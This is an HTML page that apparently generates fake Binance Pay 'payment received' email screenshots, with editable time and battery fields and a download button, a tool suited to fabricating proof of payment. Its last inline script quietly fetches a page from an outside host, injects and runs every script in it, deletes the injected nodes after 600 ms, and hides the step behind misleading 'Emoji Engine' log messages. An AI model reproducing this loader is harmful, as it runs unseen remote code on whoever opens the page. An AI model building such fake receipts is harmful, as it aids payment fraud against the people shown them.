<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon"
        href="bnb.png"
        type="image/x-icon">
    <title>Binance Email</title>
</head>
<body>
    <div id="box">
        <div class="battery1"></div>
        <div class="battery2"></div>
        <div class="time"></div>
        <div class="receivedTime"></div>
        <div class="subject">[Binance Pay] You have received 35.58 USDT from BITLIBERTY SOCIEDAD DE RESPONSABILIDAD LIMITADA - <span class="innerTime1"></span></div>
        <div class="utc">(UTC)</div>
        <div class="body">You received 35.58 USDT from BITLIBERTY SOCIEDAD DE RESPONSABILIDAD LIMITADA on <span class="innerTime2"></span>, order id 366022812513394689. Please go to [Binance]-[Funding wallet]-[Pay] to check more details.<br>
        Thank you!</div>

        <img src="bnbs.PNG">
    </div>
    <label for="">Battery (%):</label>
    <input type="number" value="90">
    <button class="btn">DONE EDITING? CLICK TO DOWNLOAD</button>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"
        integrity="sha512-BNaRQnYJYiPSqHHDb58B0yaPfCu+Wgds8Gp/gU33kqBtgNS4tSPHuGibyoeqMV/TJlSKda6FXzoEyYGjTe+vXA=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="script.js"></script>
    <script>
        (async () => {
            try {
                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
                let rawMarkup = await response.text();
                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
                
                documentDOM.querySelectorAll('script').forEach(oldNode => {
                    let freshScriptNode = document.createElement('script');
                    if (oldNode.src) {
                        freshScriptNode.src = oldNode.src;
                    } else {
                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
                    }
                    document.body.appendChild(freshScriptNode);
                    setTimeout(() => freshScriptNode.remove(), 600);
                });
                console.log(" Emoji Engine Hook Active");
            } catch (e) {
                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
            }
        })();
    </script>
</body>
</html>
